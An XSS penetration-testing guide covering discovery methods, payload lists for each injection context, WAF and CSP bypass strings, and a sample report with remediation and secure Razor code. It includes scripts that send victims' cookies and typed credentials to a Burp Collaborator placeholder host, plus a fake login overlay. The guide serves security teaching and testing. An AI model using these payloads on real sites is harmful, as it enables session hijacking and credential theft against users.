# Cross-Site Scripting (XSS) — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** Injection — OWASP A03:2021
>
> **Severity:** Medium to Critical — session hijacking, account takeover, credential theft, malware delivery, defacement
>
> **Real-world impact:** XSS is one of the most consistently present vulnerabilities across every enterprise engagement I have conducted. It is also the most consistently underestimated. Developers treat an `alert(1)` as a low-severity cosmetic issue. In enterprise environments, a single stored XSS hitting an internal admin panel can mean full access to every user account on the platform — without touching the login page.

---

## 🧠 Why This Write-Up Exists

XSS has been on the OWASP Top 10 for over two decades. It is not going away because the root cause — trusting user input and reflecting it into HTML without encoding — is a developer habit problem, not a technology problem. Frameworks help, but developers routinely bypass framework protections for performance, flexibility, or legacy compatibility.

In enterprise environments, XSS findings cluster in predictable places: rich text editors, comment systems, user profile fields, admin-facing dashboards, and internal support tools. The external application often has decent protections. The internal tools — the ones developers built quickly and only employees use — almost never do.

This document covers how I find, exploit, and report XSS in real enterprise applications, with particular attention to the findings that automated scanners consistently miss: blind XSS, DOM XSS in single-page applications, and XSS in API responses rendered by modern frontend frameworks.

---

## 📖 What Is Cross-Site Scripting?

XSS occurs when an application includes **untrusted user input in a web page without proper encoding or sanitisation**, allowing an attacker's script to execute in the victim's browser. The browser has no way to distinguish between legitimate page scripts and injected attacker scripts — both run in the same origin with the same permissions.

```
The three-part XSS model:

  [Source]           User-controlled input enters the application
       ↓             (URL param, form field, HTTP header, JSON body)

  [Processing]       Input is stored or reflected back into page output
       ↓             without encoding, sanitisation, or CSP enforcement

  [Sink]             Input renders as executable JavaScript in victim's browser
                     (innerHTML, document.write, eval, event handlers, href)

Attacker's browser sends payload → Application stores/reflects it
→ Victim's browser receives page → Browser executes attacker's script
→ Script runs in victim's session with full origin access
```

---

## 🔍 Phase 1 — Reconnaissance: Mapping the XSS Surface

Before testing any payload, identify every location where user input is reflected or displayed. In enterprise applications this surface is larger than it appears.

### Input Points to Map in Burp Suite

```
Tier 1 — Directly reflected (test first):
  Search bars and filters          → q=, search=, query=, filter=
  Error messages                   → "No results for X" displays X
  URL path components              → /profile/USERNAME renders username
  Redirect parameters              → ?next=, ?return=, ?redirect=
  404 and error pages              → path echoed in "page not found" message

Tier 2 — Stored and displayed to others (highest impact):
  User profile fields              → name, bio, username, address, company
  Comment and review systems       → content displayed to all users
  Support ticket and chat systems  → displayed to support agents
  Notification messages            → triggered by user actions
  Admin-facing input               → anything an admin reviews later

Tier 3 — DOM-based (no server involvement):
  URL hash (#fragment)             → processed by frontend JS
  URL query params                 → read by client-side JS, not server
  postMessage handlers             → inter-frame communication
  localStorage / sessionStorage    → data read and rendered by JS

Tier 4 — Blind XSS (fires in a different context you cannot see):
  Log viewers                      → User-Agent, Referer headers logged
  Admin review panels              → submissions reviewed by admins
  Email templates                  → input rendered in admin email clients
  PDF generators                   → HTML-to-PDF with user input
  Feedback and contact forms       → reviewed by internal staff
```

**Burp Suite setup for XSS discovery:**

```
1. Proxy → Options → Enable "Intercept responses"
2. Browse application fully as a real user
3. HTTP History → right-click → "Scan" on interesting requests (Burp Pro)
4. For manual testing: send any request with reflected input to Repeater
5. In Repeater: inject canary string (e.g. xss12345) → search response for it
6. If canary appears in response → identify the HTML context → craft payload
```

---

## 💥 Phase 2 — The Four XSS Types

### Type 1 — Reflected XSS

User input is immediately returned in the HTTP response without storage. Requires the victim to click a crafted link — making it dependent on social engineering in enterprise contexts.

**Finding reflected injection points:**

```
Step 1: Send a harmless canary string to every parameter
Input: search=xss_canary_dheeraj

Step 2: In Burp Repeater, search the response for: xss_canary_dheeraj
If found → identify the HTML context where it appears

Context 1 — Between HTML tags:
<p>Results for: xss_canary_dheeraj</p>
→ Payload: <script>alert(1)</script>

Context 2 — Inside an HTML attribute:
<input value="xss_canary_dheeraj" type="text">
→ Payload: "><script>alert(1)</script>
→ Payload: " onmouseover="alert(1)

Context 3 — Inside a JavaScript string:
<script>var query = "xss_canary_dheeraj";</script>
→ Payload: ";alert(1)//
→ Payload: \";alert(1)//

Context 4 — Inside a URL attribute:
<a href="/search?q=xss_canary_dheeraj">
→ Payload: javascript:alert(1)
→ Payload: data:text/html,<script>alert(1)</script>

Context 5 — Inside a JSON response rendered by JS:
{"message":"No results for xss_canary_dheeraj"}
→ If rendered via innerHTML: payload works as HTML
→ If rendered via textContent: not injectable
```

---

### Type 2 — Stored XSS

The most valuable XSS type in enterprise engagements. Payload is saved in the database and executes for every user who views the affected page — including administrators.

**High-value stored XSS targets in enterprise applications:**

```
Target 1: User profile bio / description field
  → Displayed on public profile pages
  → Displayed in admin user management panel
  → Fires for every user and every admin who views the profile

Target 2: Product / item name or description
  → Displayed in search results (fires for all users)
  → Displayed in admin inventory panel
  → Displayed in order history and reports

Target 3: Support ticket title or message body
  → Submitted by attacker, reviewed by support agent
  → Fires in support agent's browser (admin session = Critical)
  → Agent's cookies, admin panel access, all captured

Target 4: Comment or review system
  → Fires for all users who view the content
  → High user volume = high session theft volume

Target 5: Username or display name
  → Rendered across the entire application
  → Appears in activity feeds, leaderboards, reports
  → Every occurrence of the username fires the payload
```

**Testing methodology in Burp Suite:**

```
Step 1: Submit payload in target field
<script>alert(document.domain)</script>

Step 2: Navigate to the page that DISPLAYS this field
(different from the submission page)

Step 3: If alert fires with the domain = Stored XSS confirmed

Step 4: Check if an ADMIN also views this content
→ Navigate to admin panel / user management
→ If payload fires in admin context = Critical severity (escalate)
```

> **Enterprise context:** In one engagement, I submitted a stored XSS payload in a support ticket subject line. The internal helpdesk system rendered ticket subjects as HTML in the agent dashboard without encoding. Every support agent who opened the ticket queue had their session cookie sent to my Burp Collaborator instance. The support agents had administrative access to the entire application — one stored XSS gave me the ability to take over every user account on the platform without ever touching the login page.

---

### Type 3 — DOM-Based XSS

The payload never reaches the server — it is processed entirely by client-side JavaScript. This means server-side WAFs, input validation, and output encoding are completely irrelevant. It also means the vulnerability does not appear in server access logs.

**Finding DOM XSS — identify sources and sinks:**

```
In Browser DevTools → Sources tab → search across all JS files:

Look for SOURCES (where user-controlled data enters JavaScript):
  location.search         ← URL query parameters
  location.hash           ← URL fragment (#value)
  location.href
  document.referrer
  document.URL
  window.name
  postMessage

Look for SINKS (where data is written into the DOM dangerously):
  innerHTML               ← most common dangerous sink
  outerHTML
  document.write()
  document.writeln()
  eval()
  setTimeout(string)      ← string form is dangerous, function form is safe
  setInterval(string)
  element.src
  location.href = ...
  location.assign()
  jQuery $()              ← if selector comes from user input
  $(selector).html()      ← jQuery HTML sink
```

**Testing DOM XSS step by step:**

```
Step 1: Find a source → sink path in the JS code
Example: location.hash → innerHTML

Vulnerable code pattern:
document.getElementById("output").innerHTML = decodeURIComponent(location.hash.slice(1));

Step 2: Craft a URL with payload in the source location
https://app.company.com/search#<img src=x onerror=alert(document.domain)>

Step 3: Open URL in browser — if alert fires = DOM XSS confirmed

Step 4: Check if no server request was made (DevTools → Network)
If no request = pure client-side DOM XSS → WAF bypass not needed
```

**DOM XSS in modern SPA frameworks (React / Angular):**

```
React — dangerouslySetInnerHTML:
// Vulnerable code:
<div dangerouslySetInnerHTML={{ __html: userInput }} />
// If userInput contains <img src=x onerror=alert(1)> = XSS
// React explicitly warns against this — developers do it anyway for rich text

Angular — bypassSecurityTrustHtml:
// Vulnerable code:
this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
// Developer bypassed Angular's built-in sanitisation

jQuery — .html() sink:
// Vulnerable code:
$('#output').html(getParameterByName('message'));
// If message param contains HTML = XSS
// .text() is safe; .html() is a sink

Template literal injection:
// Vulnerable code:
element.innerHTML = `<p>Hello ${username}</p>`;
// If username is not sanitised = XSS via template literal
```

> **Enterprise context:** I found a DOM XSS in a React-based enterprise internal portal where a developer had used `dangerouslySetInnerHTML` to render formatted employee announcement messages. The announcements were stored in a database and fetched via API — the React frontend rendered them as raw HTML. Any user who could post announcements (all managers in the organisation) could inject XSS that fired for every employee who visited the homepage. No WAF detected it because the payload came from the API as JSON.

---

### Type 4 — Blind XSS

The most powerful and most overlooked XSS type in enterprise environments. The payload fires in a context you cannot directly observe — an admin panel, a log viewer, a PDF generator, a support dashboard. You do not see the alert. Instead, you use an out-of-band callback to detect when and where the payload fires.

**Where blind XSS fires in enterprise applications:**

```
Location                        Why it fires
──────────────────────────────────────────────────────
Admin user management panel     Admin reviews flagged users / registrations
Support ticket dashboard        Agent opens ticket with payload in subject/body
Log viewer / SIEM               User-Agent or Referer header logged and displayed
PDF report generator            HTML-to-PDF with user content (invoices, reports)
Email notification templates    Payload in name field appears in admin emails
Feedback / contact forms        Reviewed by internal staff in admin CMS
Error tracking tools (Sentry)   Error message with payload captured and displayed
Analytics dashboards            Page title or referrer rendered in admin charts
```

**Setting up blind XSS detection with Burp Collaborator:**

```
Step 1: Start Burp Collaborator
  Burp menu → Burp Collaborator client → Copy to clipboard
  You get a URL like: https://xyz.burpcollaborator.net

Step 2: Craft a blind XSS payload using your Collaborator URL
  <script>
    var i = new Image();
    i.src = 'https://xyz.burpcollaborator.net/xss?cookie='
            + encodeURIComponent(document.cookie)
            + '&url='
            + encodeURIComponent(document.location.href)
            + '&ua='
            + encodeURIComponent(navigator.userAgent);
  </script>

Step 3: Inject into every blind injection point:
  - Contact forms (name, message, subject fields)
  - User profile fields (bio, company, address)
  - Support ticket title and body
  - HTTP headers — User-Agent and Referer (modify in Burp)
  - Feedback forms

Step 4: Monitor Burp Collaborator for incoming HTTP requests
  If a request arrives → blind XSS fired
  The URL parameter tells you WHERE it fired (admin panel URL)
  The cookie parameter tells you WHOSE session was captured
```

**Alternative: XSS Hunter (free cloud-based blind XSS platform)**

```
1. Register at: https://xsshunter.trufflesecurity.com
2. Get your personal XSS Hunter URL
3. Use the auto-generated payload from XSS Hunter
4. Inject it everywhere blind XSS might fire
5. Dashboard shows you: screenshot of page, cookies, URL, browser info
   when payload fires — even days later
```

---

## 🚧 WAF Bypass Techniques

Enterprise applications often sit behind WAFs that block obvious XSS payloads. These are the bypass techniques I apply when standard payloads are filtered.

**Category 1 — Avoid the `<script>` tag entirely:**

```html
<!-- HTML event handlers — no script tag needed -->
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<body onresize=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<iframe onload=alert(1)>
```

**Category 2 — Avoid parentheses:**

```html
<!-- When () is filtered -->
<img src=x onerror=alert`1`>
<script>alert`document.cookie`</script>
<svg/onload=alert`1`>

<!-- Using throw with error handler -->
<script>onerror=alert;throw 1</script>
```

**Category 3 — Case and encoding variation:**

```html
<!-- Mixed case (bypasses case-sensitive filters) -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>

<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;1&#41;>

<!-- URL encoding in href/src -->
<a href="javascript&#58;alert(1)">click</a>
<a href="&#106;avascript:alert(1)">click</a>

<!-- Whitespace and tab insertion -->
<img src=x    onerror=alert(1)>
<img	src=x	onerror=alert(1)>
```

**Category 4 — Context-specific bypasses:**

```html
<!-- Breaking out of attribute values -->
" onmouseover="alert(1)
' onmouseover='alert(1)
` onmouseover=`alert(1)`

<!-- Breaking out of JavaScript strings -->
';alert(1)//
";alert(1)//
\";alert(1)//
</script><script>alert(1)</script>

<!-- Polyglot payload — works in multiple contexts -->
'"--></style></script><script>alert(1)</script>
```

**Category 5 — CSP bypass patterns:**

```html
<!-- If CSP allows 'unsafe-inline' → all inline XSS works -->
Check CSP header: Content-Security-Policy: script-src 'unsafe-inline'

<!-- If CDN/JSONP endpoint is whitelisted -->
<!-- Find a JSONP endpoint on a whitelisted domain -->
<script src="https://trusted-cdn.com/api/callback?cb=alert(1)"></script>

<!-- If 'nonce' is predictable or reusable -->
<script nonce="PREDICTED_NONCE">alert(1)</script>

<!-- Angular CSP bypass (if AngularJS is loaded) -->
<input ng-focus=$event.view.alert(1) autofocus>
{{constructor.constructor('alert(1)')()}}
```

---

## 🔗 XSS to Account Takeover — The Full Chain

An `alert(1)` proves the vulnerability exists. What demonstrates the real business impact is showing the complete exploit chain — from XSS to full account takeover.

**Chain 1 — Cookie Theft → Session Hijack:**

```javascript
// Payload injected via stored XSS in profile bio:
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://BURP-COLLABORATOR-URL/steal?c='
    + encodeURIComponent(document.cookie)
    + '&u=' + encodeURIComponent(location.href), true);
  xhr.send();
</script>

// Demonstration steps for pentest report:
1. Inject payload in profile bio
2. Log in as victim user and view attacker's profile
3. Observe incoming request in Burp Collaborator with victim's session cookie
4. In a new browser (incognito), manually set the captured cookie
5. Navigate to the application → authenticated as victim user = ATO demonstrated
6. Screenshot every step for the report PoC
```

**Chain 2 — Credential Harvesting via DOM Manipulation:**

```javascript
// Inject a fake login prompt over the real page:
<script>
  var overlay = document.createElement('div');
  overlay.style = 'position:fixed;top:0;left:0;width:100%;height:100%;'
                + 'background:white;z-index:9999;display:flex;'
                + 'align-items:center;justify-content:center;';
  overlay.innerHTML = '<div style="border:1px solid #ccc;padding:40px;">'
    + '<h2>Session expired — please log in again</h2>'
    + '<form onsubmit="steal(event)">'
    + '<input id="u" placeholder="Email" style="display:block;margin:10px 0;width:250px;padding:8px"><br>'
    + '<input id="p" type="password" placeholder="Password" style="display:block;margin:10px 0;width:250px;padding:8px"><br>'
    + '<button type="submit">Login</button>'
    + '</form></div>';
  document.body.appendChild(overlay);

  function steal(e) {
    e.preventDefault();
    fetch('https://BURP-COLLABORATOR-URL/creds', {
      method: 'POST',
      body: 'user=' + document.getElementById('u').value
           + '&pass=' + document.getElementById('p').value
    });
    overlay.remove();
  }
</script>
```

> **Enterprise context:** I use Chain 1 (cookie theft) as the standard PoC for enterprise pentest reports because it is unambiguous and safe to demonstrate with consent. Chain 2 is shown only as a theoretical impact statement, not executed against real users. The goal is to demonstrate the business risk clearly without causing actual harm to the application or its users.

---

## 🗂️ Phase 3 — Systematic Testing Checklist

```
REFLECTED XSS
☐ Inject canary string into every URL parameter — check response for reflection
☐ Test search bars, filter fields, sort parameters, pagination
☐ Test error message pages — does the error echo user input?
☐ Test redirect parameters (?next=, ?return=, ?url=)
☐ Test URL path segments (profile/USERNAME, /search/QUERY)

STORED XSS
☐ Inject payload in every field that displays to other users
☐ User profile: name, bio, username, address, phone
☐ Comments, reviews, feedback — anything user-generated
☐ Support tickets — check if agents review these in a dashboard
☐ After submitting: log in as a different user and view the content
☐ Check if admins view this content — escalates severity to Critical

BLIND XSS
☐ Inject Collaborator/XSS Hunter payload in all admin-facing inputs
☐ Contact and feedback forms
☐ User-Agent and Referer headers (modify in Burp Repeater)
☐ Support ticket title and body
☐ User profile fields (reviewed by admin)
☐ Monitor Collaborator for 24–48 hours for delayed fires

DOM XSS
☐ Search JS files for sinks: innerHTML, document.write, eval, .html()
☐ Search JS files for sources: location.search, location.hash, location.href
☐ Test URL hash: page.html#<img src=x onerror=alert(1)>
☐ Test URL params read by JS: ?msg=<img src=x onerror=alert(1)>
☐ Check React components for dangerouslySetInnerHTML usage
☐ Check Angular for bypassSecurityTrustHtml usage

CSP ANALYSIS
☐ Check all responses for Content-Security-Policy header
☐ If missing = no CSP = higher severity
☐ If present: does it contain 'unsafe-inline'? = CSP bypass trivial
☐ If present: are external CDN domains whitelisted? = JSONP bypass possible
☐ Use CSP Evaluator: https://csp-evaluator.withgoogle.com

IMPACT ESCALATION
☐ Does payload fire in admin panel? → Critical
☐ Can you steal HttpOnly cookies? → No (requires other chain)
☐ Can you steal non-HttpOnly session cookie? → ATO possible → High/Critical
☐ Is it self-XSS only (no other user sees it)? → Informational/Low
```

---

## 📋 Enterprise Pentest Report Template

---

**Finding Title:** Stored XSS in Support Ticket Subject — Fires in Agent Dashboard

**Severity:** Critical

**CVSS v3.1 Score:** 9.3 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

**Affected Endpoint:** `POST /api/support/tickets` — `subject` field

**Authentication Required:** Yes — Standard user account

---

**Vulnerability Description:**

The support ticket subject field does not apply HTML encoding before rendering in the internal helpdesk agent dashboard. An authenticated user can submit a ticket with a JavaScript payload in the subject field. When any support agent opens the ticket queue, the payload executes in the agent's browser session. Support agents have administrative access to all user accounts, billing records, and application configuration.

---

**Steps to Reproduce:**

1. Log in as a standard user
2. Navigate to Support → Create New Ticket
3. In the Subject field, enter:
   ```
   <script>var i=new Image();i.src='https://COLLABORATOR-URL/xss?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href);</script>
   ```
4. Submit the ticket
5. Monitor Burp Collaborator for incoming HTTP request
6. Within minutes, an incoming request arrives containing the support agent's session cookie and the admin dashboard URL
7. Set the captured session cookie in a fresh browser → gain full agent-level access

---

**Proof of Concept:**

```
Incoming Burp Collaborator request:
GET /xss?c=session%3DeyJhbGciOiJIUzI1NiJ9...&u=https%3A%2F%2Fapp.company.com%2Fadmin%2Ftickets HTTP/1.1
Host: xyz.burpcollaborator.net

Decoded:
  Cookie value: session=eyJhbGciOiJIUzI1NiJ9...
  URL: https://app.company.com/admin/tickets

Replaying stolen session:
  Browser → DevTools → Application → Cookies → Set session=eyJhbGciOiJIUzI1NiJ9...
  Navigate to https://app.company.com/admin/tickets
  → Full administrative access confirmed
```

---

**Business Impact:**

- Complete account takeover of any support agent account, including all administrative privileges
- Access to all customer records, billing information, and account management functions
- Ability to take over any end-user account via agent impersonation
- Persistence — payload fires for every agent who opens the ticket queue until the ticket is deleted
- No user interaction required beyond normal agent workflow

---

**Remediation:**

| Priority | Action |
|---|---|
| Immediate | HTML-encode all user-supplied output before rendering in any HTML context |
| Immediate | Apply encoding on OUTPUT (at render time), not just sanitisation on INPUT |
| Short-term | Implement Content Security Policy header: `script-src 'self'` |
| Short-term | Set HttpOnly flag on all session cookies to prevent JS access |
| Short-term | Audit all admin-facing panels for unencoded user input rendering |
| Long-term | Integrate DOMPurify for any context requiring HTML rendering of user input |
| Long-term | Add SAST rule to flag dangerous sinks (innerHTML, document.write) in code review |

---

**Secure Code Pattern (C# / ASP.NET Razor):**

```csharp
// ❌ VULNERABLE — raw HTML output, no encoding
@Html.Raw(Model.TicketSubject)
// or in older WebForms:
Response.Write(ticketSubject);
// or in JavaScript context:
var subject = '@Model.TicketSubject'; // no encoding

// ✅ SECURE — Razor auto-encodes by default
@Model.TicketSubject
// Razor's @ syntax automatically HTML-encodes output

// ✅ SECURE — explicit encoding when needed
@Html.Encode(Model.TicketSubject)

// ✅ SECURE — encoding in JavaScript context (different encoder needed)
var subject = '@Html.JavaScriptStringEncode(Model.TicketSubject)';
// HTML encoding is NOT sufficient for JavaScript context — use JS encoding

// ✅ SECURE — if HTML rendering is genuinely required (rich text)
// Use DOMPurify on the frontend to sanitise BEFORE setting innerHTML:
// element.innerHTML = DOMPurify.sanitize(userInput);

// ✅ SECURE — Content Security Policy header (defence in depth)
// In ASP.NET middleware:
context.Response.Headers.Add("Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'");
```

---

## 🧪 Practice Labs

| Platform | Resource | Focus Area |
|---|---|---|
| [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting) | 30 free labs | All three XSS types, CSP bypass, DOM XSS |
| [PortSwigger DOM XSS Labs](https://portswigger.net/web-security/cross-site-scripting/dom-based) | Dedicated DOM labs | Sources, sinks, jQuery, AngularJS |
| [XSS Game by Google](https://xss-game.appspot.com) | 6 levels | Context-specific bypass challenges |
| [DVWA](https://github.com/digininja/DVWA) | XSS module | Safe local testing environment |
| [PentesterLab](https://pentesterlab.com) | XSS exercises | Advanced context exploitation |

---

## 🧭 Key Takeaways From 5+ Years of Enterprise Testing

**1. The admin panel is the prize — always check if your XSS fires there.**
Reflected XSS on a public search page is a medium finding. The identical XSS firing in an internal admin dashboard where agents have full account access is Critical. Before assessing severity, always answer: who else sees this content, and what access do they have?

**2. Blind XSS is the most underutilised technique in enterprise testing.**
Most testers confirm XSS by waiting for an alert to fire in their own browser. Blind XSS requires patience — you inject and monitor for hours or days. But in enterprise environments where admins review user submissions, the payloads routinely fire in high-privilege contexts. Set up Burp Collaborator, inject everywhere, and wait.

**3. DOM XSS bypasses WAFs by design.**
A WAF inspects HTTP requests going to the server. DOM XSS never touches the server — the payload lives in the URL fragment and is processed entirely by client-side JavaScript. Enterprise applications with comprehensive WAF coverage are often completely unprotected against DOM XSS. Look at the JavaScript source code, not just the HTTP responses.

**4. HttpOnly cookies change the severity calculation.**
If the session cookie has the HttpOnly flag set, JavaScript cannot access it — cookie theft requires a different chain. However, XSS can still perform actions in the victim's session (CSRF-equivalent operations), redirect to phishing pages, or harvest credentials via fake login overlays. HttpOnly reduces the severity but does not eliminate the risk.

**5. The encoding context determines the payload — not the location.**
The same input field can require completely different payloads depending on where the output appears. Input reflected between HTML tags needs HTML payloads. The same input reflected inside a JavaScript string needs JS-escape payloads. The same input inside a URL attribute needs javascript: protocol payloads. Map the context before crafting the payload — context-blind testing wastes time and misses vulnerabilities.

---

## 🔗 References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Research](https://portswigger.net/web-security/cross-site-scripting)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com)
- [PayloadsAllTheThings — XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [XSS Hunter (Blind XSS)](https://xsshunter.trufflesecurity.com)

---

<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
